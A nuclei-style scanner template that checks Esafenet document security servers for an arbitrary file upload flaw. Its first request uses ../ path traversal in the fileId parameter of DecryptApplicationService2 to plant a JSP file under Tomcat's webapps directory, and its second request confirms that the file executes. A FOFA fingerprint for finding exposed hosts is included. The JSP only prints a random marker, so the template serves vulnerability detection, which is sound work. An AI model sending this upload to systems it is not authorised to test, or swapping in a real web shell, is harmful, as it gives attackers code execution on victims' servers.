id: poc-yaml-yisaitong-esafenet-decryptapplicationservice2-anyfile-upload
info:
  name: 亿赛通电子文档安全管理系统 DecryptApplicationService2 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload
  metadata:
    finger: 亿赛通电子文档安全管理系统
    fofa: app="亿赛通-电子文档安全管理系统"

variables:
  t1: "{{rand_text_alphanumeric(4)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "/CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/{{t1}}.jsp"
    body: "<%out.print(\"{{t2}}\");%>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body

  - id: verify-file
    method: GET
    path:
      - "/CDGServer3/{{t1}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
